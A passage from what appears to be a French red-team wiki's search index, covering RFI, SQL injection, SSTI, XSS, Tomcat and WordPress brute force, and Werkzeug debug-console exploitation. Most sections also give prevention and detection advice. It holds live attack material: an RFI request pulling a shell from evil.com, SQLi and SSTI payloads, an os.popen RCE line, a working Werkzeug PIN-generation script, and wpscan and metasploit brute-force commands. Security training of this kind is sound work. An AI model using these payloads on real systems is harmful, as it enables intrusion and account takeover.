\u2705 <code>fopen()</code>/<code>file()</code> \u2705 \u274c \u274c NodeJS <code>fs.readFile()</code> \u2705 \u274c \u274c <code>fs.sendFile()</code> \u2705 \u274c \u274c <code>res.render()</code> \u2705 \u2705 \u274c Java <code>include</code> \u2705 \u274c \u274c <code>import</code> \u2705 \u2705 \u2705 .NET <code>@Html.Partial()</code> \u2705 \u274c \u274c <code>@Html.RemotePartial()</code> \u2705 \u274c \u2705 <code>Response.WriteFile()</code> \u2705 \u274c \u274c <code>include</code> \u2705 \u2705 \u2705"},{"location":"Red%20Team/Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'inclusion de fichiers distants (RFI) se produisent lorsqu'une application web inclut des fichiers distants via une URL sans validation ad\u00e9quate des entr\u00e9es utilisateur. Cela permet \u00e0 un attaquant d'injecter des scripts malveillants h\u00e9berg\u00e9s sur des serveurs externes, conduisant \u00e0 la compromission du syst\u00e8me, \u00e0 la divulgation de donn\u00e9es sensibles, et \u00e0 d'autres cons\u00e9quences graves.</p>"},{"location":"Red%20Team/Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-rfi","title":"Exemple d'Attaque RFI","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Une application web inclut dynamiquement un fichier bas\u00e9 sur les param\u00e8tres fournis par l'utilisateur via une URL, par exemple <code>https://example.com/index.php?page=home</code>.</li> </ul> <p>Exemple de code vuln\u00e9rable :</p> <pre><code>&lt;?php \n$page = $_GET['page']; \ninclude($page . \".php\"); \n?&gt;\n</code></pre> <p>Exploitation :</p> <ul> <li>Un attaquant peut manipuler le param\u00e8tre <code>page</code> pour inclure un fichier distant malveillant, par exemple <code>https://example.com/index.php?page=http://evil.com/shell</code>.</li> </ul> <pre><code>GET /index.php?page=http://evil.com/shell HTTP/1.1 \nHost: example.com\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-rfi","title":"Pr\u00e9vention des Attaques RFI","text":"<p>D\u00e9sactiver l'Inclusion de Fichiers Distants :</p> <ul> <li>D\u00e9sactiver l'option <code>allow_url_include</code> dans le fichier de configuration PHP (<code>php.ini</code>).</li> </ul> <pre><code>; D\u00e9sactiver l'inclusion de fichiers distants \nallow_url_include = Off\n</code></pre> <p>Validation et Sanitisation des Entr\u00e9es :</p> <ul> <li>Valider et assainir toutes les entr\u00e9es utilisateur pour s'assurer qu'elles ne contiennent pas de caract\u00e8res sp\u00e9ciaux ou d'URL.</li> </ul> <pre><code>$whitelist = ['home', 'about', 'contact']; \n$page = $_GET['page']; \nif (!in_array($page, $whitelist)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page . \".php\");\n</code></pre> <p>Utilisation de Chemins Absolus :</p> <ul> <li>Utiliser des chemins absolus pour les fichiers inclus afin d'emp\u00eacher les manipulations de chemins relatifs ou d'URL.</li> </ul> <pre><code>$page = basename($_GET['page']); \ninclude(\"/var/www/html/pages/\" . $page . \".php\");\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-rfi","title":"D\u00e9tection des Failles RFI","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les inclusions de fichiers bas\u00e9es sur des entr\u00e9es utilisateur sans validation ad\u00e9quate.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en manipulant les param\u00e8tres de requ\u00eates pour inclure des fichiers distants et v\u00e9rifier la pr\u00e9sence de vuln\u00e9rabilit\u00e9s.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles RFI.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>Validation stricte des Entr\u00e9es :</p> <pre><code>$allowed_pages = ['home', 'about', 'contact']; \n$page = $_GET['page']; \nif (!in_array($page, $allowed_pages)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page . \".php\");\n</code></pre> <p>Utilisation de Fonctions S\u00e9curis\u00e9es :</p> <pre><code>$page = filter_input(INPUT_GET, 'page', FILTER_SANITIZE_STRING); \n$allowed_pages = ['home', 'about', 'contact']; \nif (!in_array($page, $allowed_pages)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude(__DIR__ . \"/pages/\" . $page . \".php\");\n</code></pre> <p>Contr\u00f4le des Chemins :</p> <pre><code>$page = realpath(__DIR__ . \"/pages/\" . $_GET['page'] . \".php\"); \n$base_dir = realpath(__DIR__ . \"/pages/\"); \nif (strpos($page, $base_dir) !== 0 || !file_exists($page)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page);\n</code></pre> Cat\u00e9gorie Information TTP Technique d'inclusion de fichier distant CWE CWE-94 (Improper Control of Generation of Code ('Code Injection')) Description de l'attaque RFI permet \u00e0 un attaquant d'inclure des fichiers distants, g\u00e9n\u00e9ralement des scripts, dans une application web. Cela se fait en exploitant des vuln\u00e9rabilit\u00e9s dans les applications web qui ne valident pas correctement les entr\u00e9es utilisateur utilis\u00e9es pour inclure des fichiers. Impacts potentiels - Ex\u00e9cution de code malveillant \u00e0 distance- Compromission du serveur web- Acc\u00e8s non autoris\u00e9 aux donn\u00e9es Comment la d\u00e9tecter - Surveillance des journaux de serveur web pour les URL externes suspectes- Scans de s\u00e9curit\u00e9 et tests de p\u00e9n\u00e9tration- Audits de code pour identifier les points d'entr\u00e9e vuln\u00e9rables Rem\u00e9diations/mitigations - Validation stricte des entr\u00e9es utilisateur- Utilisation de la liste blanche pour les URL autoris\u00e9es- Configuration s\u00e9curis\u00e9e des serveurs et des interpr\u00e9teurs de scripts- D\u00e9sactivation des inclusions de fichiers distants dans la configuration du serveur (par exemple, <code>allow_url_include</code> dans PHP) Lien de r\u00e9f\u00e9rence OWASP - Remote File Inclusion"},{"location":"Red%20Team/Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#failles-dinjection-sql-sql-injection","title":"Failles d'Injection SQL (SQL Injection)","text":""},{"location":"Red%20Team/Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'injection SQL se produisent lorsque des entr\u00e9es utilisateur sont directement incluses dans des requ\u00eates SQL sans validation ou \u00e9chappement ad\u00e9quat. Cela permet \u00e0 un attaquant de manipuler les requ\u00eates SQL ex\u00e9cut\u00e9es par l'application, pouvant conduire \u00e0 la divulgation de donn\u00e9es sensibles, \u00e0 la modification de donn\u00e9es, \u00e0 l'ex\u00e9cution de commandes administratives sur la base de donn\u00e9es, et \u00e0 d'autres cons\u00e9quences graves.</p>"},{"location":"Red%20Team/Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-sql-injection","title":"Exemple d'Attaque SQL Injection","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Une application web accepte des entr\u00e9es utilisateur et les utilise directement dans une requ\u00eate SQL, par exemple une page de connexion qui v\u00e9rifie les identifiants des utilisateurs.</li> </ul> <p>Exemple de code vuln\u00e9rable :</p> <pre><code>&lt;?php\n$username = $_POST['username'];\n$password = $_POST['password'];\n$query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";\n$result = mysqli_query($conn, $query);\n?&gt;\n</code></pre> <p>Exploitation :</p> <ul> <li>Un attaquant peut manipuler les entr\u00e9es pour alt\u00e9rer la requ\u00eate SQL, par exemple en entrant <code>' OR '1'='1</code> comme nom d'utilisateur ou mot de passe.</li> </ul> <pre><code>SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-sql-injection","title":"Pr\u00e9vention des Attaques SQL Injection","text":"<p>Utilisation de Requ\u00eates Pr\u00e9par\u00e9es :</p> <ul> <li>Utiliser des requ\u00eates pr\u00e9par\u00e9es avec des param\u00e8tres li\u00e9s pour emp\u00eacher l'injection SQL.</li> </ul> <pre><code>$stmt = $conn-&gt;prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");\n$stmt-&gt;bind_param(\"ss\", $username, $password);\nsstmt-&gt;execute();\n</code></pre> <p>\u00c9chappement des Entr\u00e9es Utilisateur :</p> <ul> <li>\u00c9chapper correctement toutes les entr\u00e9es utilisateur avant de les inclure dans des requ\u00eates SQL.</li> </ul> <pre><code>$username = mysqli_real_escape_string($conn, $_POST['username']);\n$password = mysqli_real_escape_string($conn, $_POST['password']);\n$query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";\n$result = mysqli_query($conn, $query);\n</code></pre> <p>Utilisation d'ORMs :</p> <ul> <li>Utiliser des Object-Relational Mappers (ORMs) qui abstraient les requ\u00eates SQL et fournissent des m\u00e9canismes de protection contre les injections SQL.</li> </ul> <pre><code>$user = User::where('username', $username)-&gt;where('password', $password)-&gt;first();\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-sql-injection","title":"D\u00e9tection des Failles SQL Injection","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les endroits o\u00f9 des entr\u00e9es utilisateur sont directement incluses dans des requ\u00eates SQL sans validation ou \u00e9chappement ad\u00e9quat.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en manipulant les param\u00e8tres de requ\u00eates pour v\u00e9rifier la pr\u00e9sence de vuln\u00e9rabilit\u00e9s d'injection SQL.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que SQLMap, Burp Suite, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles d'injection SQL.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>Requ\u00eates Pr\u00e9par\u00e9es :</p> <pre><code>$stmt = $conn-&gt;prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");\n$stmt-&gt;bind_param(\"ss\", $username, $password);\n$stmt-&gt;execute();\n</code></pre> <p>Utilisation de PDO :</p> <pre><code>$stmt = $pdo-&gt;prepare(\"SELECT * FROM users WHERE username = :username AND password = :password\");\n$stmt-&gt;execute(['username' =&gt; $username, 'password' =&gt; $password]);\n</code></pre> <p>Validation et Sanitation des Entr\u00e9es :</p> <pre><code>$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);\n$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);\n$stmt = $conn-&gt;prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");\n$stmt-&gt;bind_param(\"ss\", $username, $password);\n$stmt-&gt;execute();\n</code></pre> Cat\u00e9gorie Information TTP Technique d'injection de code SQL dans les requ\u00eates de base de donn\u00e9es CWE CWE-89 (Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')) Description de l'attaque L'injection SQL se produit lorsqu'un attaquant ins\u00e8re ou \"injecte\" une requ\u00eate SQL malveillante via les donn\u00e9es d'entr\u00e9e d'une application. Cela peut permettre \u00e0 l'attaquant de lire, modifier, ou supprimer des donn\u00e9es dans la base de donn\u00e9es. Impacts potentiels - Fuite de donn\u00e9es confidentielles- Perte d'int\u00e9grit\u00e9 des donn\u00e9es- Prise de contr\u00f4le de la base de donn\u00e9es Comment la d\u00e9tecter - Analyse des journaux d'applications pour des requ\u00eates SQL suspectes- Utilisation de syst\u00e8mes de d\u00e9tection d'intrusion- Tests de p\u00e9n\u00e9tration et scans de vuln\u00e9rabilit\u00e9 Rem\u00e9diations/mitigations - Utilisation de requ\u00eates pr\u00e9par\u00e9es (PreparedStatement) et ORM- Validation et \u00e9chappement des entr\u00e9es utilisateur- Mise en \u0153uvre de listes blanches pour les entr\u00e9es utilisateur- Formation des d\u00e9veloppeurs aux pratiques s\u00e9curis\u00e9es de codage Lien de r\u00e9f\u00e9rence OWASP - SQL Injection"},{"location":"Red%20Team/Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'injection de mod\u00e8les c\u00f4t\u00e9 serveur (SSTI) se produisent lorsque les entr\u00e9es utilisateur sont directement int\u00e9gr\u00e9es dans des templates sans validation ou \u00e9chappement ad\u00e9quat. Cela permet \u00e0 un attaquant d'injecter du code malveillant qui sera ex\u00e9cut\u00e9 sur le serveur, conduisant \u00e0 des compromissions de s\u00e9curit\u00e9 graves, y compris l'ex\u00e9cution de commandes arbitraires et la divulgation de donn\u00e9es sensibles.</p>"},{"location":"Red%20Team/Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-ssti","title":"Exemple d'Attaque SSTI","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Une application web utilise un moteur de template pour g\u00e9n\u00e9rer dynamiquement du contenu bas\u00e9 sur les entr\u00e9es utilisateur, par exemple, un moteur de template Jinja2 dans une application Flask.</li> </ul> <p>Exemple de code vuln\u00e9rable :</p> <pre><code>from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/greet', methods=['POST'])\ndef greet():\n    name = request.form['name']\n    template = f\"Hello {name}!\"\n    return render_template_string(template)\n</code></pre> <p>Exploitation :    - Un attaquant peut manipuler les entr\u00e9es pour injecter du code malveillant dans le template, par exemple en entrant <code>{{ 7*7 }}</code> comme nom.</p> <pre><code>POST /greet HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\nname={{ 7*7 }}\n</code></pre> <ul> <li>Le template rendu afficherait alors <code>Hello 49!</code>, indiquant que le code a \u00e9t\u00e9 ex\u00e9cut\u00e9.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-ssti","title":"Pr\u00e9vention des Attaques SSTI","text":"<p>\u00c9chappement des Entr\u00e9es Utilisateur :</p> <ul> <li>Utiliser des fonctions d'\u00e9chappement fournies par le moteur de template pour s'assurer que les entr\u00e9es utilisateur sont trait\u00e9es comme du texte brut.</li> </ul> <pre><code>from flask import escape\n\n@app.route('/greet', methods=['POST'])\ndef greet():\n    name = escape(request.form['name'])\n    template = f\"Hello {name}!\"\n    return render_template_string(template)\n</code></pre> <p>Utilisation de Templates S\u00e9curis\u00e9s :</p> <ul> <li>Utiliser des m\u00e9thodes s\u00e9curis\u00e9es pour rendre les templates qui ne permettent pas l'injection de code.</li> </ul> <pre><code>@app.route('/greet', methods=['POST'])\ndef greet():\n    name = request.form['name']\n    return render_template('greet.html', name=name)\n</code></pre> <p>Validation et Sanitation des Entr\u00e9es :</p> <ul> <li>Valider et assainir toutes les entr\u00e9es utilisateur pour s'assurer qu'elles ne contiennent pas de code malveillant.</li> </ul> <pre><code>@app.route('/greet', methods=['POST'])\ndef greet():\n    name = request.form['name']\n    if not name.isalnum():\n        return \"Invalid input!\"\n    return render_template('greet.html', name=name)\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-ssti","title":"D\u00e9tection des Failles SSTI","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les endroits o\u00f9 des entr\u00e9es utilisateur sont directement int\u00e9gr\u00e9es dans des templates sans validation ou \u00e9chappement ad\u00e9quat.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en manipulant les entr\u00e9es pour injecter des payloads SSTI et v\u00e9rifier la pr\u00e9sence de vuln\u00e9rabilit\u00e9s.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles SSTI.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>\u00c9chappement avec Jinja2 :</p> <pre><code>from jinja2 import Environment, escape\n\nenv = Environment(autoescape=True)\ntemplate = env.from_string(\"Hello {{ name }}!\")\nrendered_template = template.render(name=name)\n</code></pre> <p>Validation stricte des Entr\u00e9es :</p> <pre><code>@app.route('/greet', methods=['POST'])\ndef greet():\n    name = request.form['name']\n    if not name.isalnum():\n        return \"Invalid input!\"\n    return render_template('greet.html', name=name)\n</code></pre> <p>Utilisation de M\u00e9thodes S\u00e9curis\u00e9es :</p> <pre><code>@app.route('/greet', methods=['POST'])\ndef greet():\n    name = request.form['name']\n    return render_template('greet.html', name=name)\n</code></pre> <p>Voici les informations compl\u00e8tes et format\u00e9es pour les failles d'Upload de Fichiers et Server-Side Template Injection (SSTI).</p> Cat\u00e9gorie Information TTP Exploiter les moteurs de template c\u00f4t\u00e9 serveur pour injecter du code malveillant CWE CWE-94 (Improper Control of Generation of Code ('Code Injection')) Description de l'attaque SSTI se produit lorsqu'un moteur de template c\u00f4t\u00e9 serveur permet \u00e0 un attaquant d'injecter des expressions de template malveillantes, ce qui peut conduire \u00e0 l'ex\u00e9cution de code arbitraire, l'exfiltration de donn\u00e9es, ou d'autres actions non autoris\u00e9es. Impacts potentiels - Ex\u00e9cution de code arbitraire sur le serveur- Divulgation de donn\u00e9es sensibles- Compromission totale du serveur- D\u00e9ni de service (DoS) Comment la d\u00e9tecter - Analyse de code pour les entr\u00e9es utilisateur inject\u00e9es dans les templates- Tests de p\u00e9n\u00e9tration pour identifier les points d'injection de template- Utilisation d'outils de scan de s\u00e9curit\u00e9 pour d\u00e9tecter les vuln\u00e9rabilit\u00e9s SSTI Rem\u00e9diations/mitigations - \u00c9viter d'injecter des entr\u00e9es utilisateur directement dans les templates- Utiliser des moteurs de template s\u00e9curis\u00e9s qui n'exposent pas de fonctionnalit\u00e9s d'ex\u00e9cution de code- Valider et \u00e9chapper toutes les entr\u00e9es utilisateur- Mettre en place des politiques de s\u00e9curit\u00e9 de contenu strictes Lien de r\u00e9f\u00e9rence OWASP - Server-Side Template Injection (SSTI)"},{"location":"Red%20Team/Services/HTTP/SSTI/Payloads/","title":"Payloads","text":""},{"location":"Red%20Team/Services/HTTP/SSTI/Payloads/#aspnet-razor","title":"ASP.NET Razor","text":"<pre><code>@(1+2)\n</code></pre> <p>Execution de commande :</p> <pre><code>@{\nCode en C\n}\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/SSTI/Payloads/#java","title":"Java","text":"<pre><code>${7*7}\n${{7*7}}\n${class.getClassLoader()}\n${class.getResource(\"\").getPath()}\n${class.getResource(\"../../../../../index.htm\").getContent()}\n</code></pre> <pre><code>{% csrf_token %} # doit causer une erreur\n{{ 7*7 }}  # doit causer une erreur\nih0vr{{364|add:733}}d121r\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/SSTI/Payloads/#ruby","title":"Ruby","text":"<pre><code>&lt;%= 7 * 7 %&gt;\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Tomcat/Bruteforce%20Manager/","title":"Bruteforce Manager","text":"<pre><code>msf6 auxiliary(scanner/http/tomcat_mgr_login)\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Werkzeug/Console%20de%20debug/","title":"Console de debug","text":"<pre><code>http://domain.com/console\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Werkzeug/Console%20de%20debug/#rce","title":"RCE :","text":"<pre><code>__import__('os').popen('whoami').read();\n</code></pre> <p>Si la console est prot\u00e9g\u00e9e par un PIN, \u00e7a se complique :). Il est possible de g\u00e9n\u00e9rer le code PIN si nous avons d\u00e9j\u00e0 un acc\u00e8s \u00e0 la machine (ce qui peut permettre du lateral movement).</p>"},{"location":"Red%20Team/Services/HTTP/Werkzeug/Console%20de%20debug/#pour-generer-le-pin-plusieurs-informations-sont-necessaires","title":"Pour g\u00e9n\u00e9rer le PIN, plusieurs informations sont n\u00e9cessaires:","text":"<ul> <li><code>username</code> qui a initi\u00e9 l'application.</li> <li><code>modname</code> (flask.app, la plupart du temps).</li> <li><code>getattr(mod, '__file__', None)</code> le path vers app.py (/usr/local/lib/python3.5/dist-packages/flask/app.py , par exemple).</li> <li><code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code> g\u00e9n\u00e9ralement \"Flask\".</li> <li><code>uuid.getnode()</code> est l'adresse MAC de l'interface r\u00e9seau du serveur, sous forme d\u00e9cimale. Pour la trouver : <code>/sys/class/net/&lt;device id&gt;/address</code> puis la convertir sous forme d\u00e9cimale, par exemple avec python (exemple : <code>print(0x5600027a23ac)</code>)</li> <li><code>get_machine_id()</code> : trouvable avec ce script bash :</li> </ul> <pre><code>def get_machine_id() -&gt; t.Optional[t.Union[str, bytes]]:\n    global _machine_id\n\n    if _machine_id is not None:\n        return _machine_id\n\n    def _generate() -&gt; t.Optional[t.Union[str, bytes]]:\n        linux = b\"\"\n\n        # machine-id is stable across boots, boot_id is not.\n        for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\":\n            try:\n                with open(filename, \"rb\") as f:\n                    value = f.readline().strip()\n            except OSError:\n                continue\n\n            if value:\n                linux += value\n                break\n\n        # Containers share the same machine id, add some cgroup\n        # information. This is used outside containers too but should be\n        # relatively stable across boots.\n        try:\n            with open(\"/proc/self/cgroup\", \"rb\") as f:\n                linux += f.readline().strip().rpartition(b\"/\")[2]\n        except OSError:\n            pass\n\n        if linux:\n            return linux\n\n        # On OS X, use ioreg to get the computer's serial number.\n        try:\n</code></pre> <p>Puis remplir ce script python avec toutes les informations trouv\u00e9es :</p> <pre><code>import hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'user',  # username\n    'flask.app',  # modname\n    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address\n    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id\n]\n\n# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n# h.update(b'shittysalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv = None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n</code></pre> <p>Une fois ex\u00e9cut\u00e9, le script devrait g\u00e9n\u00e9rer un code PIN valide pour l'acc\u00e8s \u00e0 la console de werkzeug.</p> <p>[!Attention]  Plusieurs m\u00e9thodes diff\u00e9rentes existent pour trouver ces variables, et ne donnent pas le m\u00eame r\u00e9sultat final, il peut \u00eatre n\u00e9cessaire de tester plusieurs fois. Aussi, la console de debug peut se locker apr\u00e8s un certain nombre d'essais, attention !</p>"},{"location":"Red%20Team/Services/HTTP/Wordpress/WPscan/","title":"WPscan","text":"<p>Enum\u00e9ration: <pre><code>wpscan --enumeration --url http://$url\n</code></pre></p> <p>Login bruteforce:</p> <pre><code>wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://$url\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles de Cross-Site Scripting (XSS) se produisent lorsque des applications web permettent l'injection de scripts malveillants par des utilisateurs non autoris\u00e9s dans les pages consult\u00e9es par d'autres utilisateurs. Ces scripts peuvent voler des cookies, des sessions, rediriger les utilisateurs, afficher du contenu non d\u00e9sir\u00e9, et bien plus encore.</p>"},{"location":"Red%20Team/Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/#types-de-xss","title":"Types de XSS","text":"<p>XSS R\u00e9fl\u00e9chi :</p> <ul> <li>Se produit lorsque les donn\u00e9es fournies par l'utilisateur sont imm\u00e9diatement renvoy\u00e9es par l'application web sans traitement ou validation ad\u00e9quats.</li> </ul> <pre><code>&lt;form method=\"GET\" action=\"/search\"&gt;\n    &lt;input type=\"text\" name=\"query\"&gt;\n    &lt;input type=\"submit\" value=\"Search\"&gt;\n&lt;/form&gt;\n</code></pre> <p>Si l'entr\u00e9e utilisateur <code>query</code> n'est pas \u00e9chapp\u00e9e, un attaquant peut injecter du code malveillant dans l'URL, par exemple : <code>/search?query=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>.</p> <p>XSS Stock\u00e9 :</p> <ul> <li>Se produit lorsque les donn\u00e9es fournies par l'utilisateur sont stock\u00e9es sur le serveur (par exemple, dans une base de donn\u00e9es) et renvoy\u00e9es ult\u00e9rieurement sans validation ou \u00e9chappement ad\u00e9quats.</li> </ul> <pre><code>&lt;form method=\"POST\" action=\"/submit_comment\"&gt;\n    &lt;textarea name=\"comment\"&gt;&lt;/textarea&gt;\n    &lt;input type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;\n</code></pre> <p>Si l'entr\u00e9e utilisateur <code>comment</code> n'est pas \u00e9chapp\u00e9e avant d'\u00eatre affich\u00e9e, un attaquant peut stocker du code malveillant qui s'ex\u00e9cutera lorsque d'autres utilisateurs consulteront la page contenant le commentaire.</p> <p>XSS Bas\u00e9 sur le DOM :  - Se produit lorsque le script c\u00f4t\u00e9 client modifie le DOM de mani\u00e8re dynamique en utilisant des donn\u00e9es non valid\u00e9es provenant de l'utilisateur.</p> <pre><code>var user = location.hash.substring(1);\ndocument.getElementById(\"welcome\").innerHTML = \"Welcome \" + user + \"!\";\n</code></pre> <p>Si <code>location.hash</code> contient des scripts malveillants, par exemple <code>#&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, le script sera ex\u00e9cut\u00e9.</p>"},{"location":"Red%20Team/Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-xss","title":"Pr\u00e9vention des Attaques XSS","text":"<p>\u00c9chappement des Entr\u00e9es Utilisateur :</p> <ul> <li>\u00c9chapper toutes les donn\u00e9es d'entr\u00e9e utilisateur avant de les inclure dans le HTML, le JavaScript, le CSS, etc.</li> </ul> <pre><code>&lt;div id=\"welcome\"&gt;Welcome &lt;?php echo htmlspecialchars($user); ?&gt;!&lt;/div&gt;\n</code></pre> <p>Utilisation d'En-t\u00eates de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des en-t\u00eates HTTP pour aider \u00e0 prot\u00e9ger contre les attaques XSS.</li> </ul> <pre><code>Content-Security-Policy: default-src 'self'\nX-XSS-Protection: 1; mode=block\n</code></pre> <p>Validation et Sanitation des Entr\u00e9es :</p> <ul> <li>Valider et assainir toutes les entr\u00e9es utilisateur avant de les traiter ou de les stocker.</li> </ul> <pre><code>$comment = filter_input(INPUT_POST, 'comment', FILTER_SANITIZE_STRING);\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-xss","title":"D\u00e9tection des Failles XSS","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les endroits o\u00f9 des entr\u00e9es utilisateur sont incluses dans le DOM sans validation ou \u00e9chappement ad\u00e9quats.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en manipulant les param\u00e8tres de requ\u00eates et en injectant des payloads XSS pour v\u00e9rifier la pr\u00e9sence de vuln\u00e9rabilit\u00e9s.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles XSS.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>\u00c9chappement avec PHP :</p> <pre><code>&lt;?php\n$user = htmlspecialchars($_GET['user']);\necho \"Welcome \" . $user;\n?&gt;\n</code></pre> <p>Utilisation de Content Security Policy (CSP) :</p> <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'\n</code></pre> <p>Validation stricte des Entr\u00e9es :</p> 